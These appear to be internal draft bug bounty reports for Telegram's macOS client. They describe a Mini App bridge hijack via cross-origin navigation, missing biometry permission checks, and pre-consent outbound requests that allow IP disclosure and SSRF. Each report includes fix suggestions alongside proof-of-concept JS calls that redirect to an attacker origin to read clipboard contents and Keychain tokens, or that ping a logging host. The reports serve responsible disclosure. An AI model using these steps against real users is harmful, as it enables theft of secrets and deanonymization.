# Telegram Bug Bounty — Report Drafts (security@telegram.org)

> Internal drafts. Target: **TelegramMessenger/telegram-macos** (open-source, in scope, app-level).
> Reproduce ONLY in Telegram's **test environment** with your own bot created via @BotFather and a
> dedicated test account. Do not touch other users. Keep this repository private until fixes ship.
> Send one email per finding, in English, to security@telegram.org. Lead with Finding 4.

---

## Report 1 — Mini App JS-bridge hijacking via navigation bypass (`sameOrigin == false`)

**Attack surface:** Telegram macOS app — Mini App WebView bridge
(`packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift`).

**Severity (CVSS v3.1):** 7.7 — `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N` (High).

**Description:**
For Mini Apps launched without the `sameOrigin` flag (all legacy / classic web apps), the client:
1. Injects the `TelegramWebviewProxy` bridge for **any** page with no origin check (the legacy `js`
   path, `WebpageModalController.swift:1307–1310`), unlike the secured `sameOrigin == true` path.
2. Allows **all non-user-initiated navigation to any origin** — JS redirect, HTTP 302, meta refresh —
   because `decidePolicyFor` ends in `else { decisionHandler(.allow) }` (`:1621–1623`).
3. Trusts **any** main-frame message: `isTrustedMainFrameMessage` returns `true` whenever
   `requestData?.sameOrigin != true` (`:1695–1696`).
4. Delivers bridge **results** back to whatever page is currently loaded: `sendEvent` only enforces
   origin for `sameOrigin == true` (`:2893–2897`).

Consequently, after a legacy Mini App's page navigates the main frame to an attacker-controlled
origin (open redirect on the bot's server, a compromised bot, or a malicious bot), that origin gains
full, trusted access to the bridge, and bridge results are sent **to the attacker's page**. The
defect is entirely client-side (the client trusts any origin); the bot is only the delivery vector.

Verified data exfiltration through the result channel under `sameOrigin == false`:
- `clipboard_text_received` → **clipboard contents** for attach-menu / whitelisted bots. The gate
  (`isAttachMenu || attachMenuBot != nil || isWhiteListedBot` + a click within 10 s, `:1769–1774`)
  checks the **original** bot's attach-menu status; attach-menu bots are exactly the legacy
  `sameOrigin == false` ones, so the hijacked attacker page passes the gate and receives the clipboard
  (passwords, 2FA codes, crypto addresses).
- `biometry_auth_requested` → the **Keychain token** stored by the legitimate bot (`:2097`), after the
  user completes a Touch ID prompt that the UI still attributes to the original bot.
- `custom_method_invoked` → the bot server's response.

(Note: `phone_requested` / `write_access_requested` send only a status string; the phone goes to the
legitimate bot and the write grant targets the legitimate bot id — no PII leaks through those two.)

**Steps to reproduce (test environment only):**
1. In the test DC, create a bot via @BotFather and configure a Mini App whose launch does **not** set
   the `sameOrigin` flag (classic web app / attach-menu bot).
2. Host a page that on load runs `window.location.href = "https://<your-second-origin>/hijack"`.
3. On `<your-second-origin>/hijack`, call the bridge directly, e.g.
   `window.TelegramWebviewProxy.postEvent("web_app_read_text_from_clipboard", JSON.stringify({req_id:"1"}))`
   and listen for `TelegramGameProxy.receiveEvent("clipboard_text_received", …)`.
4. Open the Mini App on the macOS test client, click once inside it, observe the clipboard contents
   delivered to `<your-second-origin>` although it is not the bot's origin.
5. Optionally repeat with `web_app_biometry_request_auth` after the bot stored a token, and observe the
   token delivered to `<your-second-origin>`.

**Impact:** A malicious or compromised legacy Mini App can read the victim's clipboard and extract
biometric-protected tokens stored by the legitimate bot, exfiltrating them to an attacker origin,
while the UI continues to show the trusted bot. No root, malware, or physical access required.

**Additional details:** macOS direct-download build is unsandboxed (`Telegram-Mac.entitlements`:
`app-sandbox = false`), broadening local impact. Fix: enforce origin in `isTrustedMainFrameMessage`
and in the legacy injection path regardless of `sameOrigin`; block cross-origin main-frame navigation
in `decidePolicyFor`; gate `sendEvent` on origin unconditionally.

---

## Report 2 — Biometric API: missing `accessGranted` check (`web_app_biometry_update_token` / `request_auth`)

**Attack surface:** Telegram macOS app — Mini App biometry API
(`packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2015–2104`).

**Severity (CVSS v3.1):** 7.1 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N` (High).

**Description:**
The intended flow requires the user to grant biometric access to a bot via
`web_app_biometry_request_access` (which sets `biometryState.accessGranted`) before any Keychain
use. However neither `web_app_biometry_update_token` nor `web_app_biometry_request_auth` checks
`biometryState.accessGranted`. `web_app_biometry_request_access` does check it (`:2000`), confirming
the omission is unintended. As a result a Mini App can (a) write an arbitrary value into the
bot-scoped Keychain item without any permission grant, and (b) trigger a system Touch ID / password
prompt and read the stored item without the user ever having granted biometric access through
Telegram's own UI. This is an **access-control** defect in the client — not token theft by external
malware.

**Steps to reproduce (test environment only):**
1. Create a bot + Mini App via @BotFather in the test DC; do NOT call
   `web_app_biometry_request_access`.
2. From the Mini App call `web_app_biometry_update_token` with `{token:"probe"}`; observe
   `biometry_token_updated` success although access was never granted.
3. Call `web_app_biometry_request_auth`; observe a macOS Touch ID / password prompt appears with no
   prior Telegram-level permission grant.

**Impact:** Unauthorized biometric prompts attributed to a bot the user never authorized for
biometrics; pre-population of the bot's Keychain item. Combined with Report 1, the stored token is
exfiltrated to an attacker origin.

**Additional details:** Fix: add `guard biometryState.accessGranted else { … }` to both handlers
before any `SecItemAdd` / `SecItemCopyMatching`.

---

## Report 3 — Zero-click outbound request / IP disclosure + SSRF via `web_app_share_to_story`

**Attack surface:** Telegram macOS app — Mini App `web_app_share_to_story`
(`packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2105–2158`).

**Severity (CVSS v3.1):** 6.5 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` (Medium).

**Description:**
On receiving `web_app_share_to_story`, the client immediately calls `fetchHttpResource(url: mediaUrl)`
with a fully bot-controlled `media_url` and no scheme/host validation, **before** any story-upload
consent dialog. There is no `clickCount` or attach-menu gate, so a Mini App can trigger it on load.
The request is issued from the user's machine and reveals the real client IP; `http://` and
RFC1918 / link-local hosts are accepted, enabling an SSRF probe of the LAN.

**Steps to reproduce (test environment only):**
1. Create a bot + Mini App via @BotFather in the test DC.
2. On load, call `window.Telegram.WebApp.shareToStory("https://<your-logging-host>/px?id=test")`.
3. Observe the inbound GET at `<your-logging-host>` carrying the test client's real IP, before any
   consent UI. Optionally use `http://<LAN-IP>/` to confirm LAN reachability.

**Impact:** Zero-interaction deanonymization of the user's real IP (bypasses the in-app proxy, see
Report 4 note) and SSRF probing of internal services, from merely opening the bot's Mini App.

**Additional details:** Fix: validate scheme (`https` only) and block private/local hosts, and/or
issue the fetch only after explicit consent.

---

## Report 4 — Zero-click outbound request / IP disclosure + SSRF via `web_app_request_file_download` size probe

**Attack surface:** Telegram macOS app — `web_app_request_file_download`
(`packages/WebAppUI/.../WebpageModalController.swift:2164–2184`) →
`FileDownload.getFileSize` (`packages/FoundationUtils/Sources/FoundationUtils/FileDownload.swift:45–75`).

**Severity (CVSS v3.1):** 6.5 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` (Medium).

**Description:**
`web_app_request_file_download` calls `FileDownload.getFileSize(url:)` on the bot-controlled `url`
**before** the download confirmation dialog. `getFileSize` performs no scheme validation and issues a
HEAD request via `URLSession.shared` directly — bypassing Telegram's in-app SOCKS / MTProxy — so the
victim's real IP leaks even when an in-app proxy is configured. The returned `Content-Length` acts as
a partial oracle for internal resources (SSRF). Same class as Report 3 via a different handler and
network stack, showing a pattern of pre-consent outbound requests with unvalidated bot input.

**Steps to reproduce (test environment only):**
1. On macOS 14+ test client, create a bot + Mini App via @BotFather.
2. Call `window.Telegram.WebApp.downloadFile({url:"https://<your-logging-host>/probe", file_name:"x.bin"})`.
3. Observe the inbound HEAD at `<your-logging-host>` with the real client IP, before the confirmation
   dialog. Confirm it ignores any Telegram in-app proxy setting.

**Impact:** Zero-click IP disclosure (incl. proxy bypass) and internal-resource size oracle from
opening the bot's Mini App.

**Additional details:** `getFileSize` fires on macOS 14+. Fix: validate scheme/host and perform the
probe only after user confirmation.

---

## Supplementary note (not a standalone report) — `web_app_open_tg_link` missing interaction gate

`web_app_open_tg_link` (`WebpageModalController.swift:1917–1926`) lacks the `clickCount > 0` gate that
`web_app_open_link` has, letting a Mini App open arbitrary `tg://` links without user interaction.
Low impact (borders on nuisance); mention only as a hardening note alongside Report 1, not as a
separate submission.
